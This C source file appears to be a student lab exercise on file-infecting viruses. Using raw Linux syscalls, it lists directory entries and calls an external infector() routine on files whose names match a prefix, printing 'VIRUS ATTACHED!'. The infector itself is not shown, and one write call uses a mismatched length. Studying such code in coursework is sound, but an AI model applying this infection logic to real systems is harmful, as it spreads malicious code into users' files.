#include "util.h"

#define SYS_GETDENTS 141
#define SYS_WRITE 4
#define SYS_EXIT 1
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

extern int system_call();
extern void infection();
extern void infector(char*);
struct linux_dirent {
  unsigned long  d_ino;
  int            d_off;
  unsigned short d_reclen;
  char           d_name[];
};

#define BUF_SIZE 8192
#define O_RDONLY	     00
#define O_DIRECTORY	00200000	/* must be a directory */
enum
  {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
  };

int main (int argc , char* argv[], char* envp[])
{
  /*Complete the task here*/
  int fd;
  long nread;
  char buf[BUF_SIZE];
  struct linux_dirent *d;
  char* prefix = 0;
  int i;
  for(i = 0; i < argc; i++){
      if(strncmp(argv[i], "-a", 2) == 0){
          prefix = argv[i] + 2;
      }
  }

  fd = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);
  if (fd == -1){
      system_call(SYS_WRITE, STDOUT, "ERROR OPENING FILE!\n", strlen("ERROR OPENING FILE!\n"));
      system_call(SYS_EXIT, 0x55);
  }
  nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
  if (nread == -1){
      system_call(SYS_WRITE, STDOUT, "ERROR GETDENTS!\n", strlen("ERROR GETDENTS!\n"));
      system_call(SYS_EXIT, 0x55);
  }

  long bpos;
  for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buf + bpos);
      if(prefix == 0){
        system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
      } else {
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            if(strncmp(prefix, d->d_name, strlen(prefix)) == 0){
                infector(d->d_name);
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED!", strlen(" VIRUS ATTACHED!\n"));
            }
      }
      system_call(SYS_WRITE, STDOUT, "\n", 1);
      bpos += d->d_reclen;
  }
  return 0;
}
